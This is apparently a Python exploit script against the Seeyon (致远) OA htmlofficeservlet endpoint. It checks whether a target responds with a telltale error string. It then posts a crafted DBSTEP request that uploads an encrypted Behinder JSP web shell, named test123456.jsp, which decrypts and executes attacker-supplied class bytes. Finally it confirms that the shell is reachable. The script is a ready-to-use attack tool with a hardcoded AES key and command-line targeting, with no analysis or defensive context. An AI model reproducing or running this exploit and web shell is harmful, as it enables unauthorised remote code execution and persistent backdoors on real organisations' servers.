#/usr/bin/python3
# -*- coding: utf-8 -*-
#2020/12/22/09:43
#Marmot

import requests
import optparse

def chack(url):
    url = f"{url}/seeyon/htmlofficeservlet"
    r = requests.get(url)
    data = r.text
    if "htmoffice operate err" in data:
        print("[+] Vulnerability is there!!! ")
        print("[+] waiting ------------------")
        oaexp(url)
    else:
        print("[-] Vulnerability is nonexistent!!!")

def oaexp(url):
    headers = {
        "Content-Length": "991",
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
        "Pragma": "no-cache",
    }
    #EXP Behinder JSP
    data = """DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV\r
        OPTION=S3WYOSWLBSGr\r
        currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r
        CREATEDATE=wUghPB3szB3Xwg66\r
        RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r
        originalFileId=wV66\r
        originalCreateDate=wUghPB3szB3Xwg66\r
        FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6\r
        needReadFile=yRWZdAS6\r
        originalCreateDate=wLSGP4oEzLKAz4=iz=66\r
        <%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>"""
    r = requests.post(url=url,headers=headers,data=data)
    reuedata = r.text
    if "e45e329feb5d925b" in reuedata:
        print("[+] Script uploaded successfully！")
        url = url.replace("/seeyon/htmlofficeservlet","")
        upload(url)
    else:
        print("[-] Upload failed!")

def upload(url):
    url = f"{url}/seeyon/test123456.jsp"
    r = requests.get(url)
    requedata = r.text
    if "needReadFile=yRWZdAS6" in requedata:
        print("[+] access /seeyon/test123456.jsp")
    else:
        print("[-] Error uploading!")

def main():
    usage = "python3 oaupload.py -u http://127.0.0.1:8080"
    parser = optparse.OptionParser(usage)
    parser.add_option('-u',dest='url',type='string',help='tagget URL')
    (options,args) = parser.parse_args()
    url = options.url
    
    print("""
 .d88888b.        d8888             d8888  .d8888b.        .d8888b.           888             888               888 888 
d88P" "Y88b      d88888            d88888 d88P  Y88b      d88P  Y88b          888             888               888 888 
888     888     d88P888           d88P888 Y88b. d88P      888    888          888             888               888 888 
888     888    d88P 888          d88P 888  "Y88888"       888         .d88b.  888888 .d8888b  88888b.   .d88b.  888 888 
888     888   d88P  888         d88P  888 .d8P""Y8b.      888  88888 d8P  Y8b 888    88K      888 "88b d8P  Y8b 888 888 
888     888  d88P   888        d88P   888 888    888      888    888 88888888 888    "Y8888b. 888  888 88888888 888 888 
Y88b. .d88P d8888888888       d8888888888 Y88b  d88P      Y88b  d88P Y8b.     Y88b.       X88 888  888 Y8b.     888 888 
 "Y88888P" d88P     888      d88P     888  "Y8888P"        "Y8888P88  "Y8888   "Y888  88888P' 888  888  "Y8888  888 888                                                                                                                 
                                                                                                                致远
    """)
    chack(url)

if __name__ == "__main__":
    main()
